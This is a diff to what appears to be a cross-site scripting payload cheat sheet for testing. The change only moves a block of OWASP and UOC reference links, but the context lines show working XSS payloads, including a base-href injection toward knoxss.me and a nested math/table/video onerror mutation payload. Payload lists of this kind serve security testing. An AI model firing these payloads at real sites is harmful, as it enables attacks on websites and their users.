@@ -1,7 +1,3 @@
-Useful Links:
-https://owasp.org/www-community/xss-filter-evasion-cheatsheet
-http://seguretat.wiki.uoc.edu/index.php/XSS_Cheat_Sheet
-
 ===============================Frequently used Payloads start===============================
 
 <base href=//knoxss.me?>
@@ -45,3 +41,8 @@ https://www.icloud.com/mail/#<script></script>https://www.icloud.com/onmouseover
 <math><mtext><table><mglyph><style><math><table id="</table>"><video><source src=x onerror=alert(-7)">
 
 ===============================  For Rich Text editors end   ===============================
+
+Useful Links:
+
+https://owasp.org/www-community/xss-filter-evasion-cheatsheet
+http://seguretat.wiki.uoc.edu/index.php/XSS_Cheat_Sheet
